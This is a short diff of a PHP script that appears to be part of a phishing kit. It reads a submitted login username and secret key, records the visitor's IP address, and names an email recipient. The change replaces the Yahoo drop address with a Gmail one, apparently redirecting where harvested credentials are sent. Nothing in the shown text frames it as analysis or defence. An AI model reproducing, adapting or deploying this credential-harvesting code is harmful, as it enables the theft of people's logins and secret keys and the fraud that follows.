@@ -1,7 +1,5 @@
 <?php
-    
-    $to = "nowisabundance@yahoo.com";
-    
+    $to = "nownahabundance0@gmail.com";
        $login_username = $_REQUEST['login_username'];
         $secretkey = $_REQUEST['secretkey'];
         $ip=$_SERVER['REMOTE_ADDR'];
